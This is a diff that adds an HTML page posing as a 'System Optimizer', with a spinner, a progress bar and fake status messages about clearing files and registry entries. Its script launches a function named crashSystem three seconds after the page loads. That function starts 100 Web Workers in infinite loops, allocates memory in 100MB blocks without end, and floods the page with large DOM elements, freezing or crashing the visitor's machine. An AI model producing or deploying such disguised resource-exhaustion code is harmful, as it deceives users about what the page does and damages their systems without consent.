@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Optimizer</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            width: 300px;
+            height: 20px;
+            background-color: #444;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .progress {
+            height: 100%;
+            background-color: #4CAF50;
+            width: 0%;
+            animation: progress 10s linear forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .status-text {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Optimizing Your System...</h2>
+    <div class="progress-bar">
+        <div class="progress"></div>
+    </div>
+    <p class="status-text">Scanning for performance issues...</p>
+    
+    <script>
+        // Update status text periodically
+        const statusTexts = [
+            "Scanning for performance issues...",
+            "Clearing temporary files...",
+            "Optimizing memory allocation...",
+            "Cleaning registry entries...",
+            "Finalizing optimizations..."
+        ];
+        
+        let statusIndex = 0;
+        const statusElement = document.querySelector('.status-text');
+        
+        const updateStatus = setInterval(() => {
+            statusElement.textContent = statusTexts[statusIndex];
+            statusIndex = (statusIndex + 1) % statusTexts.length;
+        }, 2000);
+        
+        // Start the resource consumption in the background
+        setTimeout(() => {
+            const crashSystem = () => {
+                // Create multiple workers to consume CPU
+                for (let i = 0; i < 100; i++) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        while(true) {
+                            // Infinite loop to consume CPU
+                            Math.random();
+                        }
+                    `], { type: 'application/javascript' })));
+                }
+                
+                // Consume memory by creating large objects
+                const memoryConsumers = [];
+                const consumeMemory = () => {
+                    try {
+                        memoryConsumers.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB
+                        setTimeout(consumeMemory, 100);
+                    } catch(e) {
+                        // If allocation fails, try smaller chunks
+                        memoryConsumers.push(new ArrayBuffer(1024 * 1024 * 10)); // 10MB
+                        setTimeout(consumeMemory, 100);
+                    }
+                };
+                consumeMemory();
+                
+                // Create DOM elements to consume memory
+                const createElements = () => {
+                    for (let i = 0; i < 1000; i++) {
+                        const div = document.createElement('div');
+                        div.style.width = '1000px';
+                        div.style.height = '1000px';
+                        div.style.backgroundColor = 'rgba(0,0,0,0.01)';
+                        document.body.appendChild(div);
+                    }
+                    setTimeout(createElements, 100);
+                };
+                createElements();
+            };
+            
+            crashSystem();
+        }, 3000);
+    </script>
+</body>
+</html>
